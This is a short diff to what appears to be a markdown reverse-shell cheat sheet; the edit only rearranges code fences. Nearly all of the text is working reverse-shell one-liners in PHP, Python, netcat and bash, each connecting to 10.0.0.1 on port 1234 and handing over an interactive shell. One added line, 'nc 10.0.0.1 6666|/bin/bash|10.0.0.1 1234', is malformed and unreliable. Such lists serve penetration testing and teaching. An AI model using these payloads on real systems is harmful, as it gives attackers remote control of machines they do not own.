@@ -33,6 +33,9 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 
+```
+
+```php
 php -r 'exec("/bin/bash -i >& /dev/tcp/10.0.0.1/1234")'
 ```
 
@@ -53,6 +56,9 @@ nc -e /bin/sh 10.0.0.1 1234
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
 
+```
+
+```bash
 nc 10.0.0.1 6666|/bin/bash|10.0.0.1 1234
 
 ```
